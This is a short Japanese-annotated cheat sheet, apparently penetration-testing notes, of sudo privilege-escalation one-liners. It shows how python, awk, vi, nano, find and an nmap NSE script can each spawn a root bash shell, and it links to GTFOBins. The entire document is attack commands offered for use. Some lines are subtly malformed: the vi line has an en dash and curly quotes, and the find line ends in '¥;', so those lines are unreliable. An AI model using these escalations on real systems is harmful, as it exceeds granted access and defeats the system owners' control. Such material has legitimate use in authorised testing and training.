## sudo -l
#### python
`sudo python3 -c 'import os; os.system("/bin/bash")'`
#### awk
`sudo awk 'BEGIN {system("/bin/bash")}'`
#### vi
`sudo vi –c ‘:!bash’`
#### nano
- nanoの場合は、エディタ起動後、^R^X（[Ctrl]+R、[Ctrl]+X）により、コマンドの実行結果を挿入
```bash
sudo nano
^R^X # ^R^X（[Ctrl]+R、[Ctrl]+X）
reset; bash 1>&0 2>&0
```
#### find
`sudo find / -exec /bin/bash ¥;`
#### nmap
- `cat shell.nse`
  ```
  os.execute("/bin/bash")
  ```
  `sudo nmap --script ./shell.nse localhost`
#### 検索用
`https://gtfobins.github.io/#+sudo`

  
